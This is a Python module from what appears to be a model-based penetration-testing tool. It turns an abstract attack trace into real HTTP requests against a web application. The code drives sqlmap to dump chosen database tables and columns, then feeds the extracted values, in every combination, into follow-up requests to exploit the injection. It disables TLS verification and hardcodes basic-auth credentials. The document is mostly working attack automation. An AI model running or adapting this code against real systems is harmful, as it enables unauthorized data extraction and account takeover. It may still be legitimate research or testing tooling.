#!/usr/local/bin/python3.5

"""
This module executes a trace
"""


import re
import global_var
import requests
import linecache
import parser
from my_print import cprint
# disable warnings when making unverified HTTPS requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import wrapper.sqlmap
import json
import threading
import itertools

# global request
s = None

# takes an attack trace and an extension matrix, and execute the attack
def execute_attack(msc_table,extension_sqli,file_aslanpp):
    global s
    cprint("Executing the attack trace")

    # load the concretization file
    with open(global_var.concretization,"r") as data_file:
         concretization_data = json.load(data_file)

    # general fields for sperforming an HTTP request
    url = None
    method = None
    params = None
    mapping = None
    abstract_param_to_real = None
    
    # specific for executing sqlmap
    data_to_extract = []

    # sqlmap output
    sqlmap_output = None
    
    # request session object for performing subsequent HTTP requests
    s = requests.Session()
        
    # current response
    response = None

    # loop the msc_table and find when to perform a sqli attack
    for idx, message in enumerate(msc_table):
        if not "webapplication" in msc_table[idx][1][0]:
             if "a" in extension_sqli[idx][0]:
                 sqlmap_init = __sqlmap_init(message,extension_sqli,concretization_data,idx)
                 # for the execution we need (url,method,params,data_to_extract)
                 # data_to_extract => table.column
                 # sqlmap_output = execute_sqlmap(url,method,params,data_to_extract)
                 sqlmap_output = __execute_sqlmap(sqlmap_init)
                 cprint(sqlmap_output,"D")
                 if not sqlmap_output:
                     cprint("No data extracted from the database","WARNING")
                     exit()
             elif "e" in extension_sqli[idx][0]:
                 # exploit the sqli here, which is also a normal request where we use
                 # the result from sqlmap
                 cprint("exploit sqli here, crafted request","D")
                 
                 tag = message[0]

                 req = {}
                 req["url"] = concretization_data[tag]["url"]
                 req["method"] = concretization_data[tag]["method"]
                 # generate all possible combination of parameters to try
                 params = {}
                 req_params = []
                 for k,v in concretization_data[tag]["params"].items():
                     tmp = v.split("=")
                     param_pair = []
                     if tmp[1] == "?":
                        # we need to provide something from the output of sqlmap
                        table = concretization_data[tag]["tables"][tmp[0]].split(".")
                        for v in sqlmap_output[table[0]][table[1]]:
                            param_pair.append(tmp[0]+"="+v)
                        cprint(param_pair,"D")
                        req_params.append(param_pair)
                        cprint(req_params,"D")
                     else:
                         param_pair.append(tmp[0] + "=" + tmp[1])
                         req_params.append(param_pair)
                 cprint(req,"D")
                 params_perm = None
                 # I used the %26 because it might happen that the password has a &
                 params_perm = ["%26".join(str(y) for y in x) for x in itertools.product(*req_params)]
                 cprint(params_perm,"D")
                 # loop on all the possibile params combination and try to exploit the result
                 found = False
                 for param in params_perm:
                    if not found:
                        cprint("attempt to exploit sqli results","D")
                        cprint(param,"D")
                        # I used the %26 because it might happen that the password has a &
                        req["params"] = dict( item.split("=") for item in param.split("%26") )
                        cprint(req,"D")
                        response = __execute_request(req)
                        # check if reponse is valid based on the MSC
                        # pages contain the right side of a response
                        pages = msc_table[idx+1][1][2].split(".")
                        for p in pages:
                                cprint(concretization_data[p],"D")
                                try:
                                        if response != None and concretization_data[p] in response.text:
                                            cprint("valid request","D")
                                            cprint(concretization_data[p],"D")
                                            found = True
                                            break;
                                except Exception:
                                        cprint("NO ","D")
                 if not found:
                      # we coulan'td procede in the trace, abort
                      cprint("Exploitation failed, abort trace execution",color="r")
                      exit(0)
                 else:
                     cprint("Exploitation succceded",color="g")

             elif "n" in extension_sqli[idx][0]:
                 # normal http request
                 cprint(msc_table[idx][0],"D")

                 tag = message[0]

                 req = {}
                 req["url"] = concretization_data[tag]["url"]
                 req["method"] = concretization_data[tag]["method"]
                 # now create the params
                 params = {}
                 for k,v in concretization_data[tag]["params"].items():
                     tmp = v.split("=")
                     params[tmp[0]] = tmp[1]
                 req["params"] = params
                 response = __execute_request(req)
                 # check if reponse is valid based on the MSC
                 # pages contain the right side of a response
                 pages = msc_table[idx+1][1][2].split(".")
                 for p in pages:
                         cprint(concretization_data[p],"D")
                         if response == None or not( concretization_data[p] in response.text):
                            cprint("Exploitation failed, abort trace execution",color="r")
                            exit(0)
                         else:
                            cprint("Step succceded",color="g")
    cprint("Trace ended",color="g")
                             


# parameters for configuring the requests maker:
# Requests group
# - basic authentication params
# - SSL verification: True, False, CA path
# - proxy
# - proxy-cred
# - sqlmap usage

def __execute_request(request):
    global s
    url = request["url"]
    method = request["method"]
    params = request["params"]

    cprint("Execute request")
    cprint(url)
    cprint(method)
    cprint(params)
    c = __ask_yes_no("Executing request, continue?")
    if not c:
        exit(0);
    #url = 'https://157.27.244.25/chained'
    headers = {'user-agent': 'my-app/0.0.1'}
    if global_var.proxy != None:
        proxies = {"http" : "http://"+global_var.proxy,"https":"https://"+global_var.proxy}
    r = None
    if method == "GET":
        if global_var.proxy != None:
            r = s.get(url,proxies=proxies,params=params, verify=False, auth=('regis','password'))
        else:
            r = s.get(url,params=params, verify=False, auth=('regis','password'))
    else:
        if global_var.proxy != None:
            r = s.post(url,proxies=proxies, data = params, verify=False, auth=('regis','password'))
        else:
            r = s.post(url, data = params, verify=False, auth=('regis','password'))

    #r = requests.get(url, headers=headers, proxies=proxy, verify=False, auth=('regis','password'))
    cprint(r.text,"D")
    return r

"""
output format: { table { columns : [values]}}
"""

def __ask_yes_no(msg,default="y"):
    prompt = " [Y/n]"
    ret = True
    if default == "n":
        prompt = " [n/Y]"
        ret = False
    s = input(msg + prompt)
    if s == "":
        return ret
    if s == "Y" or s == "y":
        return True
    elif s == "N" or s == "n":
        return False
    else:
        print("Invalid input");
        return __ask_yes_no(msg,default)


def __execute_sqlmap(sqlmap_details):
    cprint(sqlmap_details,"D")
    c = __ask_yes_no("Executing SQLmap, continue?")
    if not c:
        exit(0);
    url = sqlmap_details["url"]
    method = sqlmap_details["method"]
    params = sqlmap_details["params"]
    data_to_extract = sqlmap_details["extract"]

    cprint("Execute sqlmap")
    wrapper.sqlmap.run_api_server()
    task = wrapper.sqlmap.new_task()
    wrapper.sqlmap.set_option("authType","Basic",task)
    wrapper.sqlmap.set_option("authCred","regis:password",task)

    url_params = ""
    for k,v in params.items():
        url_params = url_params+"&"+k+"="+v
    if method == "GET":
        wrapper.sqlmap.set_option("url",url+"/"+url_params,task)
    elif method == "POST":
        wrapper.sqlmap.set_option("url",url,task)
        wrapper.sqlmap.set_option("data",url_params,task)
    wrapper.sqlmap.set_option("dumpTable","true",task)
    for tblcol in data_to_extract:
        tbl_list = tblcol.split(".")
        cprint(tbl_list[0],"D")
        wrapper.sqlmap.set_option("tbl",tbl_list[0],task)
        wrapper.sqlmap.set_option("col",tbl_list[1],task)

    #wrapper.sqlmap.set_option("data","username=?&password=?",task)
    #wrapper.sqlmap.set_option("tbl","users",task)

    wrapper.sqlmap.start_scan(url,task)
    cprint(url,"D")
    cprint(method,"D")
    cprint(params,"D")
    cprint(data_to_extract,"D")

    stopFlag = threading.Event()
    sqlmap_output = ""
    while not stopFlag.wait(5):
        r = wrapper.sqlmap.get_status(task)
        if "terminated" in r:
            cprint("Analysis terminated","D")
            sqlmap_output = wrapper.sqlmap.get_data(task)
            stopFlag.set()
        else:
            cprint("Analysis in progress ... ","D")
    
    # Let's parse the data extracted
    cprint(sqlmap_output,"D")
    extracted_values = {}
    for tblcol in data_to_extract:
        tbl_list = tblcol.split(".")
        cprint(tbl_list[1],"D")
        tmp_table = tbl_list[0]
        tmp_column = tbl_list[1]
        try:
            extracted_values[tmp_table]
        except KeyError:
            extracted_values[tmp_table] = {}
        try:
            extracted_values[tmp_table][tmp_column] = sqlmap_output["data"][2]["value"][tmp_column]["values"]
        except Exception:
            cprint("error in the sqlmap output","E")
            wrapper.sqlmap.kill
            cprint(sqlmap_output,"D")
            exit()
        cprint("Ending sqlmap extraction","D") 
        wrapper.sqlmap.kill()
    return extracted_values

"""
Return the initialization structur for executing sqlmap. (Readability method)
"""
def __sqlmap_init(message,extension_sqli,concretization_data,idx):
    cprint("sqli attack","D")
    cprint(message,"D")
    cprint(extension_sqli[idx],"D")
    tag = message[0]
    
    sqli_init = {}
    sqli_init["url"] = concretization_data[tag]["url"]
    sqli_init["method"] = concretization_data[tag]["method"]
    # now create the params
    params = {}
    for k,v in concretization_data[tag]["params"].items():
        tmp = v.split("=")
        params[tmp[0]] = tmp[1]
    sqli_init["params"] = params
    # data to extract
    extract = []
    exploitations = extension_sqli[idx][1]
    cprint("Exploitations","D")
    cprint(exploitations,"D")
    for row in exploitations:
          tag = row[0]
          exploit_points = row[1]
          for k in exploit_points:
                   tmp_map = concretization_data[tag]["params"][k].split("=")[0]
                   tmp_table = concretization_data[tag]["tables"][tmp_map]
                   extract.append(tmp_table)
    sqli_init["extract"] = extract
    return sqli_init
    

if __name__ == "__main__":
    execute_normal_request("c")

